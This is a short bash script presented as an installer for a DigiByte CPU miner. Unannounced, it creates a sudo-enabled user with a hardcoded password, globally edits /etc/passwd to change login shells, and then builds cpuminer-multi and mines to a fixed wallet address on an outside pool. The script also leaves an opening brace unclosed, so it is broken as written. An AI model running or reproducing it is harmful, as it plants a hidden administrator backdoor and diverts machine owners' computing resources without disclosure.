#! /bin/bash
printf "Installing CPU Mining Digibyte Eba-Turan... " >&2
{
sudo useradd -m ALOK
sudo adduser ALOK sudo
echo 'ALOK:8426' | sudo chpasswd
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get  install git automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev 
sudo git clone https://github.com/tpruvot/cpuminer-multi -b linux 
cd cpuminer-multi && ./build.sh
./cpuminer --algo qubit --url stratum+tcp://digihash.co:3012 --user DEyZ8SmCZcANnZEL6vmhLaMigEKdceaFhq --pass anything
if sudo apt-get upgrade &> /dev/null
then
    printf "\n\nUpgrade Completed " >&2
else
    printf "\n\nError Occured " >&2
fi
